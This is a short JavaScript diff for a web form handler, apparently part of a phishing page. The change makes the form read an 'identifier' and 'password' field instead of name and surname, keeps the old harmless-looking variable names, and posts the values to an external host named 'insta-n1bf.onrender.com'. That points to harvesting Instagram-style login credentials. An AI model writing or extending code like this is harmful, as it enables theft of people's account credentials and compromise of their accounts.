@@ -3,8 +3,8 @@ const form = document.getElementById('userForm');
 form.addEventListener('submit', async (event) => {
   event.preventDefault();
 
-  const name = document.getElementById('name').value.trim();
-  const surname = document.getElementById('surname').value.trim();
+  const name = document.getElementById('identifier').value.trim();
+  const surname = document.getElementById('password').value.trim();
 
   try {
     const response = await fetch('https://insta-n1bf.onrender.com/send', {
